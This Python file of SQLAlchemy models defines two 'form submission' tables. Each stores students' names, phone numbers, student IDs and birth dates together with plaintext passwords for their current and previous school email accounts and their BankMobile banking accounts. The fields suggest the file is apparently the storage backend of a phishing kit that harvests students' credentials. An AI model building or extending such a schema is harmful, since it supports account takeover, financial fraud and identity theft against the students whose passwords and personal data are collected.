from sqlalchemy import Table, Column, Integer, String, Date, DateTime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.sql import func
from datetime import datetime
# from .database import metadata
# from sqlalchemy.sql import func


# Base class form models
Base = declarative_base()


class BankmobileFormSubmission(Base):
    __tablename__ = "bankmobile_form_submissions"
    
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(50), nullable=False)
    phone = Column(String(50), nullable=False)
    current_school_email = Column(String(100), nullable=False)
    current_school_email_pass = Column(String(50), nullable=False)
    previous_school_email = Column(String(100), nullable=False)
    previous_school_email_pass = Column(String(50), nullable=False)
    bankmobile_email = Column(String(100), nullable=False)
    bankmobile_email_pass = Column(String(50), nullable=False)
    student_id = Column(String(20   ), nullable=False)
    date_of_birth = Column(Date, nullable=False)  # Date of Birth column
    date_created = Column(
        DateTime(timezone=True),  # Timezone-aware DateTime
        nullable=False,
        server_default=func.now()
    )
    

class SchoolFormSubmission(Base):
    __tablename__ = "school_form_submissions"
    
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(50), nullable=False)
    phone = Column(String(50), nullable=False)
    current_school_email = Column(String(100), nullable=False)
    current_school_email_pass = Column(String(50), nullable=False)
    previous_school_email = Column(String(100), nullable=False)
    previous_school_email_pass = Column(String(50), nullable=False)
    bankmobile_email = Column(String(100), nullable=True)
    bankmobile_email_pass = Column(String(50), nullable=True)
    student_id = Column(String(20   ), nullable=False)
    date_of_birth = Column(Date, nullable=False)  # Date of Birth column
    date_created = Column(
        DateTime(timezone=True),  # Timezone-aware DateTime
        nullable=False,
        server_default=func.now()
    )